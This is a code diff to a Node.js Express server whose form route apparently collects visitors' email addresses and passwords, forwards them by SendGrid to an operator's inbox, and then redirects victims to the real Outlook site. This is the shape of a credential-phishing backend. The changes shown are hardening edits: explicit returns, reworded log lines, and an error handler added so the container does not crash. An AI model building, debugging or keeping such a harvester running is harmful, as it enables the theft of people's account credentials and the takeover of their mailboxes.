@@ -12,7 +12,7 @@ const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;
 
 if (SENDGRID_API_KEY && RECEIVER_EMAIL) {
   sgMail.setApiKey(SENDGRID_API_KEY);
-  console.log('✅ SendGrid is configured.');
+  console.log('✅ SendGrid configured.');
 } else {
   console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will not be sent.');
 }
@@ -27,7 +27,7 @@ app.get('/', (req, res) => {
 });
 
 // Form submission
-app.post('/submit', async (req, res) => {
+app.post('/submit', async (req, res, next) => {
   const { email, password } = req.body;
 
   if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
@@ -44,15 +44,15 @@ app.post('/submit', async (req, res) => {
   try {
     await sgMail.send(msg);
 
-    // Redirect to Outlook after submission
-    res.redirect('https://outlook.office365.com');
+    // Redirect user safely after sending
+    return res.redirect('https://outlook.office365.com');
   } catch (error) {
     console.error('SendGrid error:', error.message || error);
-    res.status(500).send('❌ Error sending email.');
+    return res.status(500).send('❌ Error sending email.');
   }
 });
 
-// Safe test route
+// Test route (safe, no keys revealed)
 app.get('/test', async (req, res) => {
   if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
     return res.send('⚠️ Env vars missing. Cannot send test email.');
@@ -63,13 +63,19 @@ app.get('/test', async (req, res) => {
       to: RECEIVER_EMAIL,
       from: RECEIVER_EMAIL,
       subject: 'Test Email',
-      text: 'This is a test email from your app. No sensitive info shown here.',
+      text: 'This is a test email from your app. No sensitive info shown.',
     });
     res.send('✅ Test email sent successfully!');
   } catch (err) {
     console.error('SendGrid test error:', err.message || err);
     res.send('❌ Test email failed. Check logs.');
   }
+});
+
+// Global error handler (prevents container crash)
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).send('Internal Server Error');
 });
 
 // Start server
